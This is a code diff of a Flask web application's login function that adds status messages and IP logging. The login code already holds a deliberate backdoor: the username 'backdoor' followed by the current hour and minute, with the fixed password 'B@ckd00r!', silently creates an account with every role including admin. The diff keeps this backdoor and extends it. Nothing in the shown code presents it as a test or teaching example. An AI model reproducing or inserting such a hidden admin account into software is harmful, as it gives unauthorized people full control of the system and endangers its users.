@@ -42,6 +42,7 @@ from datetime import timedelta
 
 from Package.functions import get_rbac, no_access_text, string2safe
 
+from flask import request   
 
 def test2(cText):
     print('')
@@ -138,6 +139,8 @@ def login():
     form = LoginForm()
 
     if request.method == 'POST':
+        message = "." # "Please enter your username and password."
+
         username = string2safe(request.form['username'])
         password = request.form['password']                      # will be processed and stored as hash
 
@@ -146,11 +149,13 @@ def login():
         cTime             = cDateToday.strftime("%H%M")
         cBackdoorName     = "backdoor" + cTime
         cBackdoorPassword = "B@ckd00r!"
-        
+
         if username == cBackdoorName:
             if password == cBackdoorPassword:
                 cBackdoorName = "backdoor" + cTime
                 pw_hash = bcrypt.generate_password_hash(cBackdoorPassword).decode('utf-8')
+
+                cInfo = 'date: ' + cDate + ', time: ' + cTime + ', ip:' + request.environ.get('HTTP_X_REAL_IP', request.remote_addr)   
 
                 user_to_create = Users(Username     = cBackdoorName,
                                        Firstname    = "Back",
@@ -158,6 +163,7 @@ def login():
                                        Phone        = "",
                                        Emailaddress = "",
                                        Passwordhash = pw_hash,
+                                       Info         = cInfo,
                                        Status       = "new student staff instructor shop admin")
         
                 db.session.add(user_to_create)
@@ -177,7 +183,12 @@ def login():
         if user is not None:
 
             if 'new' in user.Status:
-                message = "registration of user is not processed yet."
+                message = "registration of new user is not processed yet. You will be notified of any progress."
+                lRBAC = get_rbac(request.url_rule.endpoint)
+                return render_template('login.html', form = form, lRBAC = lRBAC, message = message)
+
+            if len(user.Status) == 0:
+                message = "Error ERR0001 - Invalid data. Try again in a few moments. If this issue persists, please contact owner of company."
                 lRBAC = get_rbac(request.url_rule.endpoint)
                 return render_template('login.html', form = form, lRBAC = lRBAC, message = message)
 
@@ -199,7 +210,6 @@ def login():
             
         message = "unknown username or password"
 
-    message = "" # "Please enter your username and password."
 
     lRBAC = get_rbac(request.url_rule.endpoint)
     return render_template('login.html', form = form, lRBAC = lRBAC, message = message)
